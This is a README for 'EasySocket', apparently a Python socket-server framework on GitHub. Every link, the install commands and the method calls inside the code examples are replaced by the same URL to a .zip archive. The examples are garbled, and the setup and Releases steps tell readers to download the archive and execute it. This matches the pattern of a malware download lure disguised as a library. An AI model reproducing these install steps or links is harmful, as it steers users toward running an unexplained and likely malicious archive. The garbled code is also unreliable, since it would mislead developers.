# EasySocket 🌐

![EasySocket](https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip%20Framework-blue)

Welcome to **EasySocket**, your go-to solution for building a Python socket server with ease. This lightweight framework allows you to integrate socket functionality quickly, making network programming straightforward and accessible.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Getting Started](#getting-started)
4. [Usage](#usage)
5. [Examples](#examples)
6. [API Reference](#api-reference)
7. [Contributing](#contributing)
8. [License](#license)
9. [Support](#support)

## Features

- **Effortless Integration**: Quickly set up a socket server with minimal configuration.
- **Lightweight**: The framework is designed to be fast and efficient, without unnecessary overhead.
- **Callback Support**: Easily manage events and responses using callback functions.
- **Minimal Setup**: Get started with just a few lines of code.
- **Python 3 Compatibility**: Fully compatible with Python 3, ensuring modern programming practices.

## Installation

To install EasySocket, simply clone the repository and install the required packages. Use the following commands:

```bash
git clone https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip
cd EasySocket
pip install -r https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip
```

For the latest releases, visit the [Releases](https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip) section. Download the latest version and execute the setup.

## Getting Started

To get started with EasySocket, follow these simple steps:

1. Import the EasySocket module in your Python script.
2. Create an instance of the socket server.
3. Define your callback functions to handle incoming connections and messages.
4. Start the server.

Here’s a simple example to illustrate the process.

## Usage

### Basic Server Setup

```python
from easysocket import EasySocket

def on_connect(client_socket):
    print("Client connected:", client_socket)

def on_message(client_socket, message):
    print("Message received:", message)
    https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip("Message received".encode())

server = EasySocket(port=12345)
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_connect
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_message
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip()
```

In this example, we define two callback functions: `on_connect` to handle new client connections and `on_message` to process incoming messages.

### Advanced Features

EasySocket supports various advanced features, including:

- **Multi-threading**: Handle multiple clients simultaneously.
- **Custom Protocols**: Easily define your own message formats.
- **Error Handling**: Robust error management to keep your server running smoothly.

## Examples

### Echo Server

Here’s a simple echo server example:

```python
from easysocket import EasySocket

def on_message(client_socket, message):
    https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip(message)

server = EasySocket(port=12345)
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_message
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip()
```

This server will echo back any message it receives.

### Chat Server

For a more complex application, consider a chat server that broadcasts messages to all connected clients:

```python
from easysocket import EasySocket

clients = []

def on_connect(client_socket):
    https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip(client_socket)

def on_message(client_socket, message):
    for client in clients:
        if client != client_socket:
            https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip(message)

server = EasySocket(port=12345)
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_connect
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip = on_message
https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip()
```

This chat server keeps track of all connected clients and broadcasts messages to everyone except the sender.

## API Reference

### EasySocket Class

#### `__init__(port: int)`

Initializes the EasySocket server on the specified port.

#### `on_connect(client_socket: socket)`

Callback function that is called when a new client connects.

#### `on_message(client_socket: socket, message: str)`

Callback function that is called when a message is received from a client.

#### `start()`

Starts the socket server.

## Contributing

We welcome contributions to EasySocket! If you have suggestions or improvements, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and create a pull request.

Please ensure your code follows our coding standards and includes tests where applicable.

## License

EasySocket is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

For any questions or issues, please check the [Releases](https://raw.githubusercontent.com/dionkaps7/EasySocket/main/canicule/Socket-Easy-unanimously.zip) section. If you encounter problems, feel free to open an issue on GitHub.

Thank you for using EasySocket! We hope it simplifies your socket programming experience.